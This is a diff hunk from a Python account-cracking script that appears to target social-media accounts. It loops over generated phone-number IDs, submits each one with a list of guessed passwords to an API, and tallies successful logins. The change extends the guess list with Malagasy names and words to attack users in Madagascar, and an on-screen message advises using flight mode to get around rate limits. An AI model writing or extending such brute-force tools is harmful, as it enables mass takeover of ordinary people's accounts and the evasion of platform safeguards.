@@ -175,7 +175,7 @@ def bhoot():
         tl = str(len(user))
         print('\x1b[38;5;155m[➤] \x1b[38;5;222mUSE FLIGHT MOD AFTER 2 MINUTES GET MORE OK IDS <>~~~');linex()
         for love in user:
-            pwx = [love[2:],love,code+love,code+love[:3],'bangladesh','free fire','i love you','sadiya','mimmim','mababa','sarmin','riya123','yousha','sabbir','mehedi','tonmoy','ayesha','fuckyou','tammana','nishat','malala','Malala','mamako','Mamako','mamiko',]
+            pwx = [love[2:],love,code+love,code+love[:3],'bangladesh','free fire','i love you','sadiya','mimmim','mababa','sarmin','riya123','yousha','sabbir','mehedi','tonmoy','ayesha','fuckyou','tammana','nishat','malala','Malala','mamako','Mamako','mamiko','malala','Malala','fitiavana','mamako', 'malalako', 'mamiko', 'mamako', 'malalako', 'mamiko', 'badoda', 'badoda', 'mendrika', 'mendrika', 'mendrikarivo', 'mendrikarivo', 'antananarivo', 'antananarivo', 'marary', 'marary', 'milely', 'milely','Fitiavana','vadiko','Vadiko,','jesosy','Jesosy','mahery,','Mahery','malagasy','Malagasy']
             ids = code+love
             TANIM.submit(api,ids,pwx,tl)
     print('TOTAL OK \033[1;92m'+str(len(oks)))
